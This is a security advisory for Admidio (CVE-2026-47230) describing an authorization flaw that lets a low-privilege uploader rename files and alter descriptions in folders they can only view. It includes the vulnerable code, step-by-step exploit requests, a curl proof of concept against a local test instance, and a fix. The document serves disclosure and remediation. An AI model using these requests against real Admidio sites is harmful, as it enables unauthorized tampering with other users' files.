# [M] Admidio: IDOR in documents-files.php allows cross-folder file rename and description changes by unauthorized uploaders

## Summary
Severity: Medium
Advisory: GHSA-q6w3-hpfv-rg36
CVE: CVE-2026-47230
CWE: CWE-639, CWE-863
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N (CVSS_V3)
Published: 2026-05-29
Source: https://github.com/advisories/GHSA-q6w3-hpfv-rg36
Type: github-advisory

## Affected
- Packagist: `admidio/admidio` — affected >=0 <5.0.10

## Details
## Summary

`modules/documents-files.php` mode `file_rename_save` shares the same root-cause shape as the cross-folder move bug (`05-documents-cross-folder-move-idor.md`): the top-level rights check at lines 79-89 validates `hasUploadRight()` on the URL parameter `folder_uuid`, but the rename operation acts on `file_uuid` — a separate URL parameter — without re-checking the folder that actually contains the file. `DocumentsService::renameFile()` resolves the target file via `getFileForDownload()` (which permits view-readable files) but does not require upload right on the file's source folder. Result: a user with upload right on any folder A can rename a file in folder B as long as they can view it. They can also overwrite the file's description.

## Details

### Vulnerable Code

`modules/documents-files.php:79-89` — top-level check binds to URL `folder_uuid`:

```php
if ($getMode != 'list' && $getMode != 'download') {
    $folder = new Folder($gDb);
    $folder->getFolderForDownload($getFolderUUID);
    if (!$folder->hasUploadRight()) {
        $gMessage->show($gL10n->get('SYS_NO_RIGHTS'));
    }
}
```

`src/Documents/Service/DocumentsService.php:272-315` — `renameFile()` resolves the file via `getFileForDownload()` (view-only) and never re-verifies upload right on the file's parent:

```php
public function renameFile(string $fileUUID, string $newName, string $newDescription): array
{
    $file = new File($this->db);
    $file->getFileForDownload($fileUUID);                          // <-- view rights, not upload
    ...
    $oldFile = $file->getFullFilePath();
    $newFile = $newName . '.' . pathinfo($oldFile, PATHINFO_EXTENSION);
    $newPath = pathinfo($oldFile, PATHINFO_DIRNAME) . '/';
    FileSystemUtils::moveFile($oldFile, $newPath . $newFile);

    $file->setValue('fil_name', $newFile);
    $file->setValue('fil_description', $newDescription);
    $file->save();
    ...
}
```

`getFileForDownload()` enforces only the *download* (read) ACL on the file's folder. There is no `hasUploadRight()` check anywhere in the rename path. The actual file remains in its original folder; only its name and description change. This means the modified metadata is visible to every other user who legitimately has download rights on that folder, while the modification itself was performed by a user who has no edit right on it.

### Exploitation Primitive

1. Attacker user `lowuser` holds `folder_upload` on `public_uploadable` (UUID `c41a99c0-…`). They have *view* (download) rights on `view_only_public` (UUID `21b417e2-…`, `fol_public=1`) but no upload/edit right there. The folder contains `admin_announcement.txt` (UUID `aaae5edd-…`).
2. Render the rename form with a `folder_uuid` of a folder lowuser CAN upload to and a `file_uuid` of the target file:
   `GET /modules/documents-files.php?mode=file_rename&folder_uuid=c41a99c0-…&file_uuid=aaae5edd-…`
   The top-level rights check at line 85 sees the public-uploadable folder and passes.
3. Submit rename:
   `POST /modules/documents-files.php?mode=file_rename_save&folder_uuid=c41a99c0-…&file_uuid=aaae5edd-…` with `adm_csrf_token=<from step 2>`, `adm_new_name=hijacked_announcement`, `adm_new_description=Hijacked!`.
   Server replies `{"status":"success"}`. `adm_files`: `fil_fol_id=7` (still the original `view_only_public`), `fil_name='hijacked_announcement.txt'`, `fil_description='Hijacked!'`. On disk: `admin_announcement.txt` is renamed to `hijacked_announcement.txt` in its original folder.

## PoC

Captured live against HEAD `c5cde53` (mariadb on `127.0.0.1:3399`, php on `127.0.0.1:8085`):

```
$ curl -sb $cookie \
    "http://127.0.0.1:8085/modules/documents-files.php?mode=file_rename&folder_uuid=c41a99c0-…&file_uuid=aaae5edd-…"
# form rendered, CSRF token X added to session

$ curl -sb $cookie -X POST \
    "http://127.0.0.1:8085/modules/documents-files.php?mode=file_rename_save&folder_uuid=c41a99c0-…&file_uuid=aaae5edd-…" \
    -d "adm_csrf_token=X&adm_new_name=hijacked_announcement&adm_new_description=Hijacked%21"
{"status":"success", …}

$ mariadb -h 127.0.0.1 -P 3399 -u admidio -p… admidio \
    -e "SELECT fil_fol_id, fil_name, fil_description FROM adm_files WHERE fil_uuid='aaae5edd-…';"
fil_fol_id  fil_name                       fil_description
7           hijacked_announcement.txt      Hijacked!
```

The folder ID `fil_fol_id=7` is `view_only_public` — the folder that `lowuser` had no upload right on. The change was applied as if `lowuser` were authorised.

## Impact

A user with the most basic Documents permission — upload to a single folder — can rename and overwrite descriptions of files in any other folder they can read. Confidentiality is unaffected (the actor already had download rights on the affected files), but integrity is broken across folder boundaries. Concretely:

* **Defacement of public announcements / policies / circulars.** A regular member can replace `admin_announcement.txt` with `hijacked_announcement.txt` and a description that misrepresents the content. Other readers see the malicious metadata.
* **Renaming-to-confuse.** Files can be renamed to identifiers that imply different content (`board_minutes_2025-Q4.pdf` → `board_minutes_DRAFT-do-not-distribute.pdf`).
* **Description-as-XSS-vector** (downstream): if any view path treats `fil_description` as raw HTML, this becomes a stored XSS by a low-privilege user; absent that, it is plain content tampering.

The CVSS reflects: `PR:L` (uploader on any folder), `S:U` (stays inside Admidio's authorisation model), `C:N` because the actor already had read access, `I:H` because the file's identity is changed for every other reader, `A:N` because files are not deleted.

## Recommended Fix

`DocumentsService::renameFile()` must check upload right on the file's source folder before mutating it:

```php
// src/Documents/Service/DocumentsService.php
public function renameFile(string $fileUUID, string $newName, string $newDescription): array
{
    $file = new File($this->db);
    $file->getFileForDownload($fileUUID);

    // verify the current user has upload (write) right on the file's parent folder,
    // not just download right (which getFileForDownload enforces)
    $sourceFolder = new Folder($this->db);
    $sourceFolder->readData($file->getValue('fil_fol_id'));
    if (!$sourceFolder->hasUploadRight()) {
        throw new Exception('SYS_NO_RIGHTS');
    }
    ...
}
```

Equivalently, in `modules/documents-files.php` `case 'file_rename_save'`, resolve the file's parent folder and check `hasUploadRight()` against it before calling the service. The same fix should be applied to other documents-files modes that take a `file_uuid` independently of `folder_uuid`.

## Related

This bug shares its root cause with `05-documents-cross-folder-move-idor.md` — both flow from the top-level rights check at lines 79-89 binding to URL `folder_uuid` rather than the actual file's parent. A single fix to enforce source-folder upload right inside `File::moveToFolder()` and `DocumentsService::renameFile()` (and any other operations on file_uuid) closes both.

## References
- https://github.com/Admidio/admidio/security/advisories/GHSA-q6w3-hpfv-rg36
- https://github.com/Admidio/admidio
